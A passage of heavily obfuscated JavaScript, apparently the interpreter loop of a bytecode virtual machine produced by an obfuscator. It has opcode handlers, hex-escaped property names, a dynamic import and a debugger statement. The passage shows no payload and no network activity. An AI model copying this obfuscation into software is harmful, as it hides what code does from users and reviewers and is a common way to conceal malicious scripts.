a constructor');J_132fec['_$9k6c7p']=W;try{let xO=xE['\x61'+'\x70'+'\x70'+'\x6c'+'\x79'](p,xe);xO!==undefined&&xO!==p&&typeof xO==='object'&&(p&&Object['\x61'+'\x73'+'\x73'+'\x69'+'\x67'+'\x6e'](xO,p),p=xO,xK=!![]);}catch(xf){if(xf instanceof TypeError&&(xf['\x6d'+'\x65'+'\x73'+'\x73'+'\x61'+'\x67'+'\x65']['\x69'+'\x6e'+'\x63'+'\x6c'+'\x75'+'\x64'+'\x65'+'\x73']("'new'")||xf['\x6d'+'\x65'+'\x73'+'\x73'+'\x61'+'\x67'+'\x65']['\x69'+'\x6e'+'\x63'+'\x6c'+'\x75'+'\x64'+'\x65'+'\x73']('constructor'))){let xG=Reflect['\x63'+'\x6f'+'\x6e'+'\x73'+'\x74'+'\x72'+'\x75'+'\x63'+'\x74'](xE,xe,W);xG!==p&&p&&Object['\x61'+'\x73'+'\x73'+'\x69'+'\x67'+'\x6e'](xG,p),p=xG,xK=!![];}else throw xf;}finally{delete J_132fec['_$9k6c7p'];}Q++;break;}},function(xj){while(!![]){let xP=xj&0xffff,xe=xj>>>0x10,xE=s[xP],xO=k[xe];xx(xE[xO]),Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=k[xj];if(xP===null||xP===undefined)throw new TypeError("Cannot read property '"+String(xe)+"' of "+xP);xx(xP[xe]),Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR(),xE=xR(),xO;if(typeof xE==='function')xO=Object['\x67'+'\x65'+'\x74'+'\x50'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'+'\x4f'+'\x66'](xE);else{let xF=Object['\x67'+'\x65'+'\x74'+'\x50'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'+'\x4f'+'\x66'](xE),xv=xF&&xF['\x63'+'\x6f'+'\x6e'+'\x73'+'\x74'+'\x72'+'\x75'+'\x63'+'\x74'+'\x6f'+'\x72']&&xF['\x63'+'\x6f'+'\x6e'+'\x73'+'\x74'+'\x72'+'\x75'+'\x63'+'\x74'+'\x6f'+'\x72']['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65']===xF;xv?xO=Object['\x67'+'\x65'+'\x74'+'\x50'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'+'\x4f'+'\x66'](xF):xO=xF;}let xf=null,xG=xO;while(xG!==null){xf=Object['\x67'+'\x65'+'\x74'+'\x4f'+'\x77'+'\x6e'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'+'\x44'+'\x65'+'\x73'+'\x63'+'\x72'+'\x69'+'\x70'+'\x74'+'\x6f'+'\x72'](xG,xe);if(xf)break;xG=Object['\x67'+'\x65'+'\x74'+'\x50'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'+'\x4f'+'\x66'](xG);}xf&&xf['\x73'+'\x65'+'\x74']?xf['\x73'+'\x65'+'\x74']['\x63'+'\x61'+'\x6c'+'\x6c'](xE,xP):xO[xe]=xP;xx(xP),Q++;break;}},function(xj){while(!![]){let xP=xR();xx(n(xP)),Q++;break;}},function(xj){while(!![]){T['\x70'+'\x6f'+'\x70'](),Q++;break;}},function(xj){while(!![]){xR(),Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xS(),xE=k[xj];Object['\x64'+'\x65'+'\x66'+'\x69'+'\x6e'+'\x65'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'](xe['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'],xE,{'\x76\x61\x6c\x75\x65':xP,'\x77\x72\x69\x74\x61\x62\x6c\x65':!![],'\x65\x6e\x75\x6d\x65\x72\x61\x62\x6c\x65':![],'\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65':!![]}),Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xS(),xE=k[xj];Object['\x64'+'\x65'+'\x66'+'\x69'+'\x6e'+'\x65'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'](xe,xE,{'\x67\x65\x74':xP,'\x65\x6e\x75\x6d\x65\x72\x61\x62\x6c\x65':![],'\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65':!![]}),Q++;break;}},function(xj){while(!![]){let xP=xR();xx(Symbol['\x6b'+'\x65'+'\x79'+'\x46'+'\x6f'+'\x72'](xP)),Q++;break;}},function(xj){while(!![]){let xP,xe;xj!==undefined?(xe=xR(),xP=k[xj]):(xP=xR(),xe=xR());let xE=delete xe[xP];xx(xE),Q++;break;}},function(xj){while(!![]){xx(undefined),Q++;break;}},function(xj){while(!![]){s[xj]=xR(),Q++;break;}},function(xj){while(!![]){xx(!xR()),Q++;break;}},function(xj){while(!![]){let xP=xR();xR();let xe=xS(),xE=k[xj];!J_132fec['_$iZ9Ctg']&&(J_132fec['_$iZ9Ctg']=new Map());let xO=J_132fec['_$iZ9Ctg'];!xO['\x68'+'\x61'+'\x73'](xE)&&xO['\x73'+'\x65'+'\x74'](xE,new WeakMap());let xf=xO['\x67'+'\x65'+'\x74'](xE);xf['\x73'+'\x65'+'\x74'](xe,xP),Q++;break;}},function(xj){while(!![]){let xP=xR();xx(import(xP)),Q++;break;}},function(xj){while(!![]){xx(null),Q++;break;}},function(xj){while(!![]){let xP=xR();xP!==null&&xP!==undefined?Q=xY(L[Q]):Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR();if(xe===null||xe===undefined)throw new TypeError("Cannot read property '"+String(xP)+"' of "+xe);xx(xe[xP]),Q++;break;}},function(xj){while(!![]){if(xo===null){if(x5||!x6){xo=[];if(w)for(let xP=0x0;xP<w['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68'];xP++){xo[xP]=w[xP];}!x5&&Object['\x64'+'\x65'+'\x66'+'\x69'+'\x6e'+'\x65'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'](xo,'callee',{'\x76\x61\x6c\x75\x65':M,'\x77\x72\x69\x74\x61\x62\x6c\x65':!![],'\x65\x6e\x75\x6d\x65\x72\x61\x62\x6c\x65':![],'\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65':!![]});}else{let xe=w?w['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68']:0x0,xE={};xo=new Proxy([],{'\x67\x65\x74':function(xO,xf,xG){if(xf==='length')return xe;if(xf==='callee')return M;if(xf===Symbol['\x69'+'\x74'+'\x65'+'\x72'+'\x61'+'\x74'+'\x6f'+'\x72'])return function(){let xv=0x0,xa=xe;return{'\x6e\x65\x78\x74':function(){if(xv<xa){let xt=xv<w['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68']?w[xv]:xE[xv];return xv++,{'\x76\x61\x6c\x75\x65':xt,'\x64\x6f\x6e\x65':![]};}return{'\x64\x6f\x6e\x65':!![]};}};};if(typeof xf==='string'){let xv=parseInt(xf,0xa);if(!isNaN(xv)&&xv>=0x0){if(xv<w['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68'])return w[xv];return xE[xv];}}let xF=Array['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'][xf];if(typeof xF==='function')return function(){let xa=[];for(let xt=0x0;xt<xe;xt++){xa[xt]=xt<w['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68']?w[xt]:xE[xt];}return xF['\x61'+'\x70'+'\x70'+'\x6c'+'\x79'](xa,arguments);};return undefined;},'\x73\x65\x74':function(xO,xf,xG){if(xf==='length')return xe=xG,!![];if(typeof xf==='string'){let xF=parseInt(xf,0xa);if(!isNaN(xF)&&xF>=0x0){xF<w['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68']?w[xF]=xG:xE[xF]=xG;if(xF>=xe)xe=xF+0x1;return!![];}}return!![];},'\x68\x61\x73':function(xO,xf){if(xf==='length'||xf==='callee')return!![];if(typeof xf==='string'){let xG=parseInt(xf,0xa);if(!isNaN(xG)&&xG>=0x0&&xG<xe){if(xG<w['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68'])return xG in w;return xG in xE;}}return xf in Array['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'];},'\x64\x65\x6c\x65\x74\x65\x50\x72\x6f\x70\x65\x72\x74\x79':function(xO,xf){if(typeof xf==='string'){let xG=parseInt(xf,0xa);if(!isNaN(xG)&&xG>=0x0)return xG<w['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68']?delete w[xG]:delete xE[xG],!![];}return!![];}});}}xx(xo),Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xP['\x6e'+'\x65'+'\x78'+'\x74']();xx(xe),Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR();xx(xe|xP),Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xS(),xE=k[xj];Object['\x64'+'\x65'+'\x66'+'\x69'+'\x6e'+'\x65'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'](xe,xE,{'\x73\x65\x74':xP,'\x65\x6e\x75\x6d\x65\x72\x61\x62\x6c\x65':![],'\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65':!![]}),Q++;break;}},function(xj){while(!![]){let xP=z[Q];T['\x70'+'\x75'+'\x73'+'\x68']({['\x5f'+'\x24'+'\x49'+'\x53'+'\x45'+'\x68'+'\x41'+'\x31']:xP[0x0]>=0x0?xY(xP[0x0]):undefined,['\x5f'+'\x24'+'\x49'+'\x35'+'\x57'+'\x6e'+'\x63'+'\x59']:xP[0x1]>=0x0?xY(xP[0x1]):undefined,['\x5f'+'\x24'+'\x31'+'\x47'+'\x56'+'\x37'+'\x65'+'\x69']:xP[0x2]>=0x0?xY(xP[0x2]):undefined,['\x5f'+'\x24'+'\x45'+'\x31'+'\x47'+'\x4e'+'\x48'+'\x35']:V}),Q++;break;}},function(xj){while(!![]){let xP=xj&0xffff,xe=xj>>>0x10;xx(s[xP]*k[xe]),Q++;break;}},function(xj){while(!![]){let xP=xR();if(xj>=0x0){let xe=k[xj];xy['_$TDiWlH'][xe]=xP;}Q++;break;}},function(xj){while(!![]){if(T['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68']>0x0){let xP=T[T['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68']-0x1];if(xP['_$I5WncY']!==undefined){x3['_$gFiiye']=!![],x3['_$Nd2DmM']=xY(L[Q]),Q=xP['_$I5WncY'];break;}}Q=xY(L[Q]);break;}},function(xj){while(!![]){if(x1['_$BLHqcK']){let xP=x1['_$hG5yMT'];x1['_$BLHqcK']=![],x1['_$hG5yMT']=undefined,xJ=!![],xH=xP;return;}if(x2['_$vjufYF']){let xe=x2['_$cL1ahp'];x2['_$vjufYF']=![],x2['_$cL1ahp']=0x0,Q=xe;break;}if(x3['_$gFiiye']){let xE=x3['_$Nd2DmM'];x3['_$gFiiye']=![],x3['_$Nd2DmM']=0x0,Q=xE;break;}if(x0!==null){let xO=x0;x0=null;throw xO;}Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR();xx(xe!==xP),Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR();xx(xe<<xP),Q++;break;}},function(xj){while(!![]){let xP=xj&0xffff,xe=xj>>>0x10;xx(s[xP]-k[xe]),Q++;break;}},function(xj){while(!![]){let xP=xR(),xe={'\x76\x61\x6c\x75\x65':xP};D['\x61'+'\x64'+'\x64'](xe),xx(xe),Q++;break;}},function(xj){while(!![]){s[xj]=s[xj]+0x1,Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xS(),xE=k[xj],xO=typeof xe==='function'&&xe['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65']?xe['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65']:xe;Object['\x64'+'\x65'+'\x66'+'\x69'+'\x6e'+'\x65'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'](xO,xE,{'\x67\x65\x74':xP,'\x65\x6e\x75\x6d\x65\x72\x61\x62\x6c\x65':xO===xe,'\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65':!![]}),Q++;break;}},function(xj){while(!![]){xy&&xy['_$h1dVob']&&(xy=xy['_$h1dVob']);Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xS(),xE=k[xj],xO=typeof xe==='function'&&xe['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65']?xe['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65']:xe;Object['\x64'+'\x65'+'\x66'+'\x69'+'\x6e'+'\x65'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'](xO,xE,{'\x73\x65\x74':xP,'\x65\x6e\x75\x6d\x65\x72\x61\x62\x6c\x65':xO===xe,'\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65':!![]}),Q++;break;}},function(xj){while(!![]){let xP=k[xj];xP in J_132fec?xx(typeof J_132fec[xP]):xx(typeof H[xP]);Q++;break;}},function(xj){while(!![]){let xP=xR();xx(typeof xP==='bigint'?xP-0x1n:xP-0x1),Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xS(),xE=k[xj];Object['\x64'+'\x65'+'\x66'+'\x69'+'\x6e'+'\x65'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'](xe,xE,{'\x76\x61\x6c\x75\x65':xP,'\x77\x72\x69\x74\x61\x62\x6c\x65':!![],'\x65\x6e\x75\x6d\x65\x72\x61\x62\x6c\x65':![],'\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65':!![]}),Q++;break;}},function(xj){while(!![]){let xP=k[xj];!xy['_$aVHknk']&&(xy['_$aVHknk']={});xy['_$aVHknk'][xP]=!![],Q++;break;}},function(xj){while(!![]){debugger;Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR(),xE=xS(),xO=typeof xE==='function'&&xE['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65']?xE['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65']:xE;Object['\x64'+'\x65'+'\x66'+'\x69'+'\x6e'+'\x65'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'](xO,xe,{'\x73\x65\x74':xP,'\x65\x6e\x75\x6d\x65\x72\x61\x62\x6c\x65':xO===xE,'\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65':!![]}),Q++;break;}},function(xj){while(!![]){let xP=xR();xP&&typeof xP['\x72'+'\x65'+'\x74'+'\x75'+'\x72'+'\x6e']==='function'&&xP['\x72'+'\x65'+'\x74'+'\x75'+'\x72'+'\x6e']();Q++;break;}},function(xj){while(!![]){xR(),xx(undefined),Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR(),xE=xS();Object['\x64'+'\x65'+'\x66'+'\x69'+'\x6e'+'\x65'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'](xE,xe,{'\x76\x61\x6c\x75\x65':xP,'\x77\x72\x69\x74\x61\x62\x6c\x65':!![],'\x65\x6e\x75\x6d\x65\x72\x61\x62\x6c\x65':![],'\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65':!![]}),Q++;break;}},function(xj){while(!![]){let xP=s[xj]-0x1;s[xj]=xP,xx(xP),Q++;break;}},function(xj){while(!![]){let xP=xR(),xe=xR();xx(xe<xP),Q++;break;}}];xm[xX[xu]](xB);if(xJ)return xJ=![],xH;}break;}catch(xj){if(T['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68']>0x0){let xP=T[T['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68']-0x1];V=xP['_$E1GNH5'];if(xP['_$ISEhA1']!==undefined)xx(xj),Q=xP['_$ISEhA1'],xP['_$ISEhA1']=undefined,xP['_$I5WncY']===undefined&&T['\x70'+'\x6f'+'\x70']();else xP['_$I5WncY']!==undefined?(Q=xP['_$I5WncY'],xP['_$UzO0c6']=xj):(Q=xP['_$1GV7ei'],T['\x70'+'\x6f'+'\x70']());continue;}throw xj;}}return V>0x0?xR():xK?p:undefined;}function*E(N,w,c,M,W,p){let I=[],V=0x0,s=new Array((N['p']||0x0)+(N['l']||0x0)),Q=0x0,k=N['c'],h=N['i'],L=N['j']||{},z=N['x']||{},Z=h['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68']>>0x1,T=[],x0=null,x1={['\x5f'+'\x24'+'\x42'+'\x4c'+'\x48'+'\x71'+'\x63'+'\x4b']:![],['\x5f'+'\x24'+'\x68'+'\x47'+'\x35'+'\x79'+'\x4d'+'\x54']:undefined},x2={['\x5f'+'\x24'+'\x76'+'\x6a'+'\x75'+'\x66'+'\x59'+'\x46']:![],['\x5f'+'\x24'+'\x63'+'\x4c'+'\x31'+'\x61'+'\x68'+'\x70']:0x0},x3={['\x5f'+'\x24'+'\x67'+'\x46'+'\x69'+'\x69'+'\x79'+'\x65']:![],['\x5f'+'\x24'+'\x4e'+'\x64'+'\x32'+'\x44'+'\x6d'+'\x4d']:0x0},x4=N['o']||r,x5=!!N['st'],x6=!!N['sp'];var x7=0x0,x8=null;let x9=N['seKey'],xx,xR,xS,xb,xi,xA;if(x9!==undefined){let xr=xD=>typeof xD==='number'&&Number['\x69'+'\x73'+'\x46'+'\x69'+'\x6e'+'\x69'+'\x74'+'\x65'](xD)&&Number['\x69'+'\x73'+'\x49'+'\x6e'+'\x74'+'\x65'+'\x67'+'\x65'+'\x72'](xD)&&xD>=-0x80000000&&xD<=0x7fffffff&&!Object['\x69'+'\x73'](xD,-0x0)?xD^x9|0x0:xD;xx=xD=>{I[V++]=xr(xD);},xR=()=>xr(I[--V]),xS=()=>xr(I[V-0x1]),xb=xD=>{I[V-0x1]=xr(xD);},xi=xD=>xr(I[V-xD]),xA=(xD,xl)=>{I[V-xD]=xr(xl);};}else xx=xD=>{I[V++]=xD;},xR=()=>I[--V],xS=()=>I[V-0x1],xb=xD=>{I[V-0x1]=xD;},xi=xD=>I[V-xD],xA=(xD,xl)=>{I[V-xD]=xl;};let xY=xD=>xD,xy={['\x5f'+'\x24'+'\x68'+'\x31'+'\x64'+'\x56'+'\x6f'+'\x62']:c,['\x5f'+'\x24'+'\x54'+'\x44'+'\x69'+'\x57'+'\x6c'+'\x48']:Object['\x63'+'\x72'+'\x65'+'\x61'+'\x74'+'\x65'](null)};if(w)for(let xD=0x0;xD<Math['\x6d'+'\x69'+'\x6e'](w['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68'],N['p']||0x0);xD++){s[xD]=w[xD];}let xo=null,xK=![];if(N['ni']!==undefined&&M){let xl=N['c'][N['ni']];xy['_$TDiWlH'][xl]=M;if(N['nfe']){if(!xy['_$W7Fy6A'])xy['_$W7Fy6A']={};xy['_$W7Fy6A'][xl]=!![];}try{Object['\x64'+'\x65'+'\x66'+'\x69'+'\x6e'+'\x65'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'](M,'name',{'\x76\x61\x6c\x75\x65':xl,'\x77\x72\x69\x74\x61\x62\x6c\x65':![],'\x65\x6e\x75\x6d\x65\x72\x61\x62\x6c\x65':![],'\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65':!![]});}catch(xn){}}while(Q<Z){try{while(Q<Z){let xg=Q<<0x1,xC=h[xg],xu=xC,xd=x4[xu],xq=h[xg+0x1],xB=xq===null?undefined:xq;if(xu===0x7a){let xj=xR(),xP=yield{['\x5f'+'\x24'+'\x6c'+'\x55'+'\x38'+'\x49'+'\x32'+'\x31']:0x1,['\x5f'+'\x24'+'\x36'+'\x41'+'\x33'+'\x52'+'\x50'+'\x6f']:xj};xx(xP),Q++;continue;}if(xu===0x78){let xe=xR(),xE=yield{['\x5f'+'\x24'+'\x6c'+'\x55'+'\x38'+'\x49'+'\x32'+'\x31']:0x2,['\x5f'+'\x24'+'\x36'+'\x41'+'\x33'+'\x52'+'\x50'+'\x6f']:xe};if(xE&&typeof xE==='object'&&xE['_$lU8I21']===0x4){let xO=xE['_$6A3RPo'];if(T['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68']>0x0){let xf=T[T['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68']-0x1];if(xf['_$I5WncY']!==undefined){x1['_$BLHqcK']=!![],x1['_$hG5yMT']=xO,Q=xf['_$I5WncY'];continue;}}return xO;}xx(xE),Q++;continue;}if(xu===0x79){let xG=xR(),xF=yield{['\x5f'+'\x24'+'\x6c'+'\x55'+'\x38'+'\x49'+'\x32'+'\x31']:0x3,['\x5f'+'\x24'+'\x36'+'\x41'+'\x33'+'\x52'+'\x50'+'\x6f']:xG};xx(xF),Q++;continue;}if(typeof xm==='undefined')var xJ=![],xH,xX={0x0:0x41,0x1:0x6a,0x2:0x6f,0x3:0x65,0x4:0x25,0x5:0x2e,0x6:0x5e,0x7:0x24,0x8:0x28,0x9:0x0,0xa:0x53,0xb:0x44,0xc:0x36,0xd:0x34,0xe:0x3f,0xf:0x3c,0x10:0x8,0x11:0x84,0x12:0x3e,0x13:0x13,0x14:0x10,0x15:0x74,0x16:0x58,0x17:0x2,0x18:0x7c,0x19:0x4,0x1a:0x4a,0x1b:0x22,0x20:0x6c,0x28:0x30,0x29:0x43,0x2a:0x1a,0x2b:0x7b,0x2c:0x8d,0x2d:0x15,0x2e:0x4c,0x2f:0x12,0x32:0x56,0x33:0x19,0x34:0x46,0x35:0x70,0x36:0x14,0x37:0x5c,0x38:0x51,0x39:0x39,0x3a:0x76,0x3b:0x64,0x3c:0x78,0x3d:0x11,0x3e:0x7a,0x3f:0x5d,0x40:0x79,0x46:0x61,0x47:0x42,0x48:0x71,0x49:0x50,0x4a:0x69,0x4b:0x38,0x4c:0x33,0x4d:0x5,0x4e:0x7,0x4f:0x3b,0x51:0x3a,0x52:0x4b,0x5a:0xd,0x5b:0x1e,0x5d:0x7e,0x5e:0x45,0x5f:0x54,0x64:0x27,0x68:0x4d,0x69:0x5f,0x6a:0x6e,0x6e:0x55,0x6f:0x1c,0x70:0x83,0x7b:0x73,0x7c:0x89,0x7f:0x29,0x80:0x3d,0x81:0x35,0x82:0xa,0x83:0x5a,0x84:0x63,0x8c:0x2b,0x8d:0x20,0x8e:0x2f,0x8f:0x62,0x90:0x66,0x91:0x80,0x92:0x82,0x93:0x85,0x94:0x67,0x95:0x75,0x96:0x37,0x97:0x6,0x98:0x57,0x99:0x47,0x9a:0x3,0x9b:0x52,0x9c:0x6d,0x9d:0x21,0x9e:0x17,0xa0:0x5b,0xa1:0x72,0xa2:0x49,0xa3:0x8a,0xa4:0x40,0xa7:0x1b,0xa8:0x32,0xa9:0x68,0xaa:0x16,0xab:0x8b,0xac:0x23,0xad:0x88,0xae:0xc,0xaf:0x4f,0xc8:0x87,0xc9:0x1,0xca:0x2c,0xd2:0xe,0xd3:0x31,0xd4:0x9,0xd5:0x48,0xd6:0x81,0xd7:0x4e,0xd8:0x2a,0xd9:0x59,0xda:0x86,0xdb:0x26,0xfa:0x7f,0xfb:0x1d,0xfc:0x18,0xfd:0x7d,0xfe:0x77,0xff:0x60,0x100:0xf,0x101:0xb,0x102:0x1f,0x103:0x6b,0x104:0x2d,0x105:0x8c},xm=[function(xv){while(!![]){w[xv]=xR(),Q++;break;}},function(xv){while(!![]){Q++;break;}},function(xv){while(!![]){xx(~xR()),Q++;break;}},function(xv){while(!![]){let xa=xR(),xt=xR(),xU=k[xv],xN=null;if(J_132fec['_$iZ9Ctg']){let xM=J_132fec['_$iZ9Ctg'],xW=xM['\x67'+'\x65'+'\x74'](xU);xW&&xW['\x68'+'\x61'+'\x73'](xt)&&(xN=xW['\x67'+'\x65'+'\x74'](xt));}if(xN===null){let xp='_$HnpK5c'+xU['\x73'+'\x75'+'\x62'+'\x73'+'\x74'+'\x72'+'\x69'+'\x6e'+'\x67'](0x1)+'_$7iRR7j';xp in xt&&(xN=xt[xp]);}if(xN===null)throw new TypeError("Cannot read private member "+xU+" from an object whose class did not declare it");if(typeof xN!=='function')throw new TypeError(xU+" is not a function");let xw=[];for(let xI=0x0;xI<xa;xI++){xw['\x75'+'\x6e'+'\x73'+'\x68'+'\x69'+'\x66'+'\x74'](xR());}let xc=xN['\x61'+'\x70'+'\x70'+'\x6c'+'\x79'](xt,xw);xx(xc),Q++;break;}},function(xv){while(!![]){let xa=xR(),xt=xR();xx(xt>>xa),Q++;break;}},function(xv){while(!![]){xx({}),Q++;break;}},function(xv){while(!![]){let xa=xR(),xt=xR(),xU=k[xv];!J_132fec['_$iZ9Ctg']&&(J_132fec['_$iZ9Ctg']=new Map());let xN=J_132fec['_$iZ9Ctg'],xw="set_"+xU,xc=xN['\x67'+'\x65'+'\x74'](xw);if(xc&&xc['\x68'+'\x61'+'\x73'](xt)){let xI=xc['\x67'+'\x65'+'\x74'](xt);xI['\x63'+'\x61'+'\x6c'+'\x6c'](xt,xa),xx(xa),Q++;break;}let xM='_$HnpK5c'+"set_"+xU['\x73'+'\x75'+'\x62'+'\x73'+'\x74'+'\x72'+'\x69'+'\x6e'+'\x67'](0x1)+'_$7iRR7j';if(xt['\x63'+'\x6f'+'\x6e'+'\x73'+'\x74'+'\x72'+'\x75'+'\x63'+'\x74'+'\x6f'+'\x72']&&xM in xt['\x63'+'\x6f'+'\x6e'+'\x73'+'\x74'+'\x72'+'\x75'+'\x63'+'\x74'+'\x6f'+'\x72']){let xV=xt['\x63'+'\x6f'+'\x6e'+'\x73'+'\x74'+'\x72'+'\x75'+'\x63'+'\x74'+'\x6f'+'\x72'][xM];xV['\x63'+'\x61'+'\x6c'+'\x6c'](xt,xa),xx(xa),Q++;break;}let xW=xN['\x67'+'\x65'+'\x74'](xU);if(xW&&xW['\x68'+'\x61'+'\x73'](xt)){xW['\x73'+'\x65'+'\x74'](xt,xa),xx(xa),Q++;break;}let xp='_$5nAHRc'+xU['\x73'+'\x75'+'\x62'+'\x73'+'\x74'+'\x72'+'\x69'+'\x6e'+'\x67'](0x1)+'_$NTag4F';if(xp in xt){xt[xp]=xa,xx(xa),Q++;break;}throw new TypeError("Cannot write private member "+xU+" to an object whose class did not declare it");break;}},function(xv){while(!![]){let xa=xR(),xt=k[xv];xa===null||xa===undefined?xx(undefined):xx(xa[xt]);Q++;break;}},function(xv){while(!![]){let xa=xR();xx(typeof xa==='bigint'?xa+0x1n:xa+0x1),Q++;break;}},function(xv){while(!![]){let xa=k[xv],xt=xR(),xU=xy,xN=![];while(xU){if(xU['_$TDiWlH']&&xa in xU['_$TDiWlH']){if(xU['_$W7Fy6A']&&xa in xU['_$W7Fy6A'])throw new TypeError('Assignment to constant variable.');xU['_$aVHknk']&&xa in xU['_$aVHknk']&&delete xU['_$aVHknk'][xa];xU['_$TDiWlH'][xa]=xt,xN=!![];break;}xU=xU['_$h1dVob'];}if(!xN){if(xa in J_132fec)J_132fec[xa]=xt;else xa in H?H[xa]=xt:H[xa]=xt;}Q++;break;}},function(xv){while(!![]){let xa=xR(),xt=xa['\x6e'+'\x65'+'\x78'+'\x74']();xx(Promise['\x72'+'\x65'+'\x73'+'\x6f'+'\x6c'+'\x76'+'\x65'](xt)),Q++;break;}},function(xv){while(!![]){let xa=xv&0xffff,xt=xv>>>0x10;s[xa]<k[xt]?Q=xY(L[Q]):Q++;break;}},function(xv){while(!![]){let xa=xR(),xt=xR(),xU=xS();Object['\x64'+'\x65'+'\x66'+'\x69'+'\x6e'+'\x65'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'](xU,xt,{'\x67\x65\x74':xa,'\x65\x6e\x75\x6d\x65\x72\x61\x62\x6c\x65':![],'\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65':!![]}),Q++;break;}},function(xv){while(!![]){xx([]),Q++;break;}},function(xv){while(!![]){let xa=xR(),xt={['\x5f'+'\x24'+'\x54'+'\x44'+'\x69'+'\x57'+'\x6c'+'\x48']:Object['\x63'+'\x72'+'\x65'+'\x61'+'\x74'+'\x65'](null),['\x5f'+'\x24'+'\x57'+'\x37'+'\x46'+'\x79'+'\x36'+'\x41']:Object['\x63'+'\x72'+'\x65'+'\x61'+'\x74'+'\x65'](null),['\x5f'+'\x24'+'\x61'+'\x56'+'\x48'+'\x6b'+'\x6e'+'\x6b']:Object['\x63'+'\x72'+'\x65'+'\x61'+'\x74'+'\x65'](null),['\x5f'+'\x24'+'\x68'+'\x31'+'\x64'+'\x56'+'\x6f'+'\x62']:xa};xy=xt,Q++;break;}},function(xv){while(!![]){let xa=xv&0xffff,xt=xv>>>0x10;xx(s[xa]<k[xt]),Q++;break;}},function(xv){while(!![]){let 